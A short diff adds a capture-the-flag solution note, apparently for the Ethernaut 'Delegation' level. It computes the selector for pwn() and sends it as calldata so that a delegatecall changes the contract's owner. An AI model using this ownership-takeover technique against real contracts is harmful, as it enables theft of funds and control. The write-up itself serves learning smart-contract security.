@@ -1,0 +1,4 @@
+1. in brower console `web3.utils.keccak256("pwn()").slice(0, 10)`
+  or in contract `bytes4(keccak256("pwn()"));`
+  to get  is hash for function pwn() in Delegate -> '0xdd365b8b'
+2. CallData with data 0xdd365b8b -> run Delegate.pwn() -> owner changed in Delegation. It's feature of Calldata
